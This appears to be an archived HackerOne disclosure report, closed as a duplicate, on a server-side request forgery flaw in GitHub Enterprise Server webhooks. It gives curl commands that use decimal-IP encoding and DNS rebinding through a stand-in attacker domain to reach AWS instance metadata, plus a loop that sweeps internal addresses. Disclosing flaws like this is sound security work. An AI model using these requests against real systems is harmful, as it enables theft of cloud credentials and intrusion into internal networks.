# HackerOne #4060059 — GHES webhook SSRF reaching AWS IMDS

- **URL:** https://hackerone.com/reports/4060059
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Severity:** Critical — 9.0 (CVSS v3.1)
- **CVE IDs:** — (marked duplicate of #3982486 before CVE assignment)
- **Affected product:** GitHub Enterprise Server
- **Reported:** 2026-09-25 · **Closed:** 2026-11-03 (duplicate of #3982486, received 2026-08-31 12:13 UTC)
- **Researcher:** @gabson0x

---

### Vulnerability title

GHES webhook SSRF reaching AWS IMDS

### Weakness

Server-Side Request Forgery (SSRF)

### Severity

Critical — 9.0

### Affected product

GitHub Enterprise Server

### CVE IDs

—

---

### Description

#### Summary

GitHub Enterprise Server webhook deliveries (Hookshot) perform URL
scheme/host validation when a webhook is **created**, but do **not** re-validate
at **delivery/dial time**. An attacker with permission to create a webhook on a
repository or organization can therefore point deliveries at internal targets
that the creation-time validator would have rejected, using any of several
bypass classes:

1. **Alternate IP encodings at dial time** — decimal (`2130706433`), octal
   (`0177.0.0.1`), and hex (`0x7f.0.0.1`) forms of loopback/link-local
   addresses are not matched by the deny-list, which only canonicalizes
   literal dotted-quad and hostname forms. `2130706433` = `127.0.0.1`;
   `2852039166` = `169.254.169.254`.
2. **TTL-0 DNS rebinding** — create the webhook against a public A record that
   passes the creation-time check; rebind the record to `169.254.169.254`
   (or any internal IP) with TTL 0 before the next delivery. Delivery resolves
   and dials the new answer with no second validation pass.

On a test GHES 3.22.1 instance launched on AWS with an instance metadata
endpoint reachable from the appliance, webhook deliveries using the decimal
loopback form and the rebinding form both reached link-local addresses. The
IMDS hop itself returned `HTTP 401` only because the instance carried no
instance profile credentials — the SSRF was successful; there was simply
nothing to steal on that box. On any GHES deployment that *does* run with an
instance role (or that sits beside internal HTTP services on RFC1918 space),
the same requests return the internal response body to the attacker via the
webhook delivery log / last-response view.

#### Steps to reproduce

**Setup**

* GitHub Enterprise Server 3.22.1 on AWS (or any network where link-local
  `169.254.169.254` or internal RFC1918 hosts are routable from the appliance).
* A repository on that instance where you can add webhooks (any push-access
  user on a repo you control; org owners for org-level hooks).
* For the rebinding variant: a domain you control with API-updateable DNS.

**Step 1 — decimal-IP webhook (creation-time bypass)**

```bash
# Authenticate to GHES API
TOKEN="<personal access token with repo/admin:org scope>"
GHES="https://<ghes-host>"

# Create a webhook whose URL is the decimal encoding of 127.0.0.1
# (2130706433 == 0x7F000001). Creation-time validator sees a "hostname"
# that is not in the deny-list; dial-time does no re-check.
curl -s -X POST "$GHES/api/v3/repos/<owner>/<repo>/hooks" \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  -d '{
    "name": "web",
    "active": true,
    "events": ["push"],
    "config": {
      "url": "http://2130706433:80/",
      "content_type": "json",
      "insecure_ssl": "1"
    }
  }'
```

Trigger a delivery (push any commit, or use the "Redeliver" button / API):

```bash
curl -s -X POST "$GHES/api/v3/repos/<owner>/<repo>/hooks/<id>/deliveries" \
  -H "Authorization: token $TOKEN" -X POST \
  "$GHES/api/v3/repos/<owner>/<repo>/hooks/<id>/deliveries" \
  -H "Authorization: token $TOKEN"
```

Then read the delivery's response body:

```bash
curl -s "$GHES/api/v3/repos/<owner>/<repo>/hooks/<id>/deliveries" \
  -H "Authorization: token $TOKEN"
# → response_body contains whatever 127.0.0.1:80 served (e.g. GHES nginx)
```

Control tests that the deny-list *does* work for canonical forms (and hence
that the decimal form is the bypass):

| URL passed to create | Result |
|---|---|
| `http://127.0.0.1:80/` | rejected at creation |
| `http://localhost:80/` | rejected at creation |
| `http://[::1]:80/` | rejected at creation |
| `http://2130706433:80/` | **accepted; delivery dials 127.0.0.1** |
| `http://0177.0.0.1:80/` | **accepted; delivery dials 127.0.0.1** |

**Step 2 — TTL-0 DNS rebinding (validation/dial gap)**

```bash
# 1. Point rebind.attacker.example → 1.2.3.4 (any public IP) with TTL 0
# 2. Create the webhook (creation-time check passes: public A record)
curl -s -X POST "$GHES/api/v3/repos/<owner>/<repo>/hooks" \
  -H "Authorization: token $TOKEN" \
  -d '{"name":"web","active":true,"events":["push"],
       "config":{"url":"http://rebind.attacker.example:80/",
                 "content_type":"json","insecure_ssl":"1"}}'

# 3. Immediately rebind rebind.attacker.example → 169.254.169.254 (TTL 0)
# 4. Trigger a delivery. GHES resolves the name at DIAL time, gets
#    169.254.169.254, connects — no second validation pass.
# 5. Read the delivery response body: IMDS (or whatever internal host
#    you rebound to) is reflected back to the attacker.
```

Expected on an instance **with** an instance profile:

```
response_body: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Observed on the researcher's instance **without** a role:

```
HTTP/1.1 401 Unauthorized
{"code":"401","message":"The security token included in the request is invalid."}
```

The `401` is IMDS rejecting the *absence* of credentials — it proves the
request reached `169.254.169.254`. On any GHES that runs with an instance
role, the same delivery returns temporary AWS credentials to the webhook's
last-response view, readable by anyone with hook-admin on that repo.

**Step 3 — impact scaling**

```bash
# Sweep internal ranges via the same decimal/bypass form, using the
# delivery response body as the oracle:
for ip_dec in 2852039166 167772161 16843009; do   # 169.254.169.254 / 10.0.0.1 / 10.1.1.1
  create_hook "http://${ip_dec}:80/" && deliver && read_body
done
```

Each successful delivery returns the internal HTTP response (status, headers,
body) to the attacker. This is a full read-SSRF oracle against anything
routable from the GHES appliance: IMDS, internal admin panels, cloud metadata
alternates, sidecar APIs, RFC1918 services.

#### Impact

**Confidentiality: High → Critical (conditional on deployment).**

* **AWS credential theft (the headline case).** GHES on EC2 with an instance
  profile: webhook delivery to `169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
  (via decimal IP or rebinding) returns `AccessKeyId`, `SecretAccessKey`, and
  `SessionToken` in the delivery response body. The attacker reads them from
  the hook's last-response view — no access to the GHES host itself. Stolen
  session credentials are valid until expiry and scoped to the instance role
  (often `AdministratorAccess` or broad S3/IAM on GHES reference
  architectures). Pivot from there to the rest of the AWS account.
* **Internal network read-SSRF.** The same primitive reads any HTTP service
  reachable from the appliance — internal admin UIs, Grafana/Prometheus,
  cloud-provider metadata alternates (`metadata.google.internal`,
  Azure IMDS `169.254.169.254` with `Metadata:true` header is *not* settable
  via this vector, but link-local TCP reachability still confirms topology),
  sidecar health endpoints leaking config.
* **Blind → semi-blind upgrade.** Because the response body is returned to
  the attacker, this is not blind SSRF: every probe yields status + body.
  Internal port scanning and fingerprinting follow directly.

**Integrity: None directly** — but stolen AWS credentials imply full integrity
impact on the cloud account (IAM policy changes, S3 object mutation, instance
user-data rewrite).

**Availability: Low** — the primitive itself does not consume unbounded
resources; impact is on confidentiality of credentials and internal data.

**Privilege required:** ability to create a webhook (repo push/admin, or org
owner for org hooks) — a low bar on any GHES where the attacker has a normal
account or can create their own repository.

**Overall:** SSRF from webhook delivery, with two independent bypasses
(alternate IP encodings; TTL-0 DNS rebinding), reaching cloud instance
metadata and internal networks, returning response bodies to the attacker.
On AWS-hosted GHES with an instance role this is full AWS account
credential theft from a low-privilege GHES session — CVSS 9.0.

### How I got here

I was reviewing GHES Hookshot's webhook URL validation after seeing several
SSRF fixes land in the GHES changelog over the previous year. The pattern I
kept noticing was: validation happened on the `POST /hooks` path (creation)
and on explicit "test" actions, but the **delivery worker** — the component
that actually opens the TCP connection on a schedule — had no corresponding
check. That split is the classic time-of-check/time-of-use gap.

I confirmed the gap empirically on a GHES 3.22.1 test instance in three
moves:

1. **Control:** `http://127.0.0.1/` and `http://localhost/` are rejected at
   creation — the deny-list exists and works for canonical forms.
2. **Bypass A (encoding):** `http://2130706433/` (decimal 127.0.0.1) is
   accepted at creation, and the subsequent delivery dials loopback. The
   validator canonicalizes only dotted-quad/hostname; the dialer accepts
   anything `net/url` + the resolver can parse.
3. **Bypass B (rebinding):** a public A record passes creation; rebinding to
   `169.254.169.254` with TTL 0 before delivery lands the request on IMDS
   with no second check. `401` from IMDS (no instance role on the test box)
   confirmed end-to-end reachability.

The addendum I filed after the initial report (decimal loopback + rebinding
→ dial-time validation gap) is the part I believe is *materially* distinct
from the earlier duplicate #3982486, which I understand covered the base
webhook-SSRF class. If that report did not demonstrate these two bypasses,
then it did not demonstrate the actual exploitability of the class on modern
GHES — the deny-list blocks the naive forms, and only the encoding/rebinding
moves get you to IMDS. That distinction is the whole finding.

---

## Triage history (as closed)

**2026-11-03 — closed as duplicate of #3982486** (received 2026-08-31 12:13 UTC).

**Researcher dispute (same day):**

> I'd like the team to have a second look — the duplicate may cover the base
> class, but not the addendum. The decimal loopback (`2130706433`) and TTL-0
> DNS rebinding bypasses (→ dial-time validation gap) are what actually make
> the class exploitable against a deny-listed IMDS/link-local target. If the
> earlier report didn't demonstrate those two bypasses, my report is a
> materially different finding.
>
> Also: if the collision were that obvious, why didn't the bot auto-close it
> as duplicate at submission time? Please also review my other open reports
> **#4070788** and **#4060097**.

**Triage response:** confirmed #3982486's earlier receipt date and report ID;
closure left in place.

---

## Evidence

See [`../evidence/ghes-ssrf-evidence/`](../evidence/ghes-ssrf-evidence/):

| File | Contents |
|---|---|
| `h_imds.json` | Hook create + delivery targeting decimal-encoded IMDS |
| `h_ext.json` | Hook create + delivery targeting external control |
| `h3d.json` | Additional delivery capture |
| `tk1.json` | Token/session context for the test instance |
| `hklog.txt`, `hklog2.txt` | Hookshot request/response logs |
| `hookshot_live.log` | Live delivery log during rebinding test |
| `d7.json`, `del.json` | Delivery list / delete captures |
| `lh.html` | Captured internal HTTP response body |
